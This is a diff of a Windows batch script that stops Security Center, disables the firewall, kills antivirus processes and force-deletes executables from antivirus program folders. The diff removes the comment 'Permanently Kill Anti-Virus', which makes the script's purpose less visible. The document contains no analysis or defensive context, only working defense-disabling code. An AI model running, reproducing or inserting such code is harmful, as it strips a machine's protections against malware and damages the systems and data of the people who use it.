@@ -1,6 +1,4 @@
 @ echo off
-rem
-rem Permanently Kill Anti-Virus
 net stop “Security Center”
 netsh firewall set opmode mode=disable
 tskill /A av*
@@ -127,4 +125,3 @@ del /Q /F C:\Program Files\apvxdwin\*.exe
 del /Q /F C:\Program Files\webproxy\*.exe
 del /Q /F C:\Program Files\panda
 software\*.*
-rem
